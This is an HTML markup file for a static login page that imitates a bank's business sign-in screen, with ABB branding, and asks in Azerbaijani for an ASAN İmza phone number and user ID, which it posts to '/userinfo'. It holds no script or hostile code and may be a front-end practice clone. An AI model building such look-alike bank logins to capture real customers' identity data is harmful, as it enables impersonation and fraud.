<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ABB Login</title>
    <link rel="stylesheet" href="./main.css" />
  </head>
  <body>
    <div class="container">
      <div class="left">
        <header>
          <img class="logo" src="images/Abb Business logo.png" alt="" />
          <nav class="languages">
            <li><a href="#">AZ</a></li>
            <li><a href="#">EN</a></li>
            <li><a href="#">RU</a></li>
          </nav>
        </header>
        <div class="login-title">
          <p class="asan-imza">
            <span class="black">ASAN imza</span> / KOBIL OTP
          </p>
          <form action="/userinfo" class="login-form">
           
            <label for="login-label">ASAN İmza mobil nömrəsi</label>
            <br />
            <div class="div-form">
            <span class="country-code">+994</span>
            <input required type="tel" id="login-label" class="telephone" />
            </div>
            
            <label for="id-parol">ASAN İmza istifadəçi ID-si</label>
            <input required type="text" id="id-parol" class="asan-id" />
            <br>
            <button class="davam-et">Davam et</button>
            <p class="or">və ya</p>
            <button class="sign">Qeydiyyat</button>
          </form>
          
        </div>
        <footer>
            <img class="group" src="images/Group.png" alt="">
            <a href="" class="ib">Köhnə İB-ə keçid</a>
        </footer>
      </div>
      <div class="right">
        <img class="main-photo" width="100%" height="100%" src="images/main.png" alt="" />
      </div>
    </div>
  </body>
</html>
